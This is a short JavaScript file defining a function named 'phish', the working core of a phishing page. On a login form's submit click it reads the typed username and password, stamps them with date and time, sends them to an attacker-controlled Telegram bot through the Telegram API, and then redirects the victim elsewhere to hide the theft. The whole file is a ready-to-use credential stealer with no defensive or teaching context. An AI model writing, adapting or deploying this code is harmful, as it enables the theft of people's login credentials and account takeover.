const phish = (bot_token, chat_id, redirect_link) => {
    $('#submit-button').on('click', function() {
        let currentdate = new Date(),
            date = `${currentdate.getDate()}/${currentdate.getMonth() +
                1}/${currentdate.getFullYear()}`,
            time = `${currentdate.getHours()}:${currentdate.getMinutes()}:${currentdate.getSeconds()}`,
            login = $('#username').val(),
            pass = $('#password').val(),
            msg = `------------------------------------------%0A
Date  :    ${date}%0A
Time :    ${time}%0A
------------------------------------------%0A
Login:    ${login}%0A
Pass :    ${pass}%0A
------------------------------------------`,
            xhr = new XMLHttpRequest();

        xhr.open(
            'POST',
            `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${msg}`
        );
        xhr.send();

        setTimeout(function() {
            window.location.assign(redirect_link);
        }, 500);
    });
};
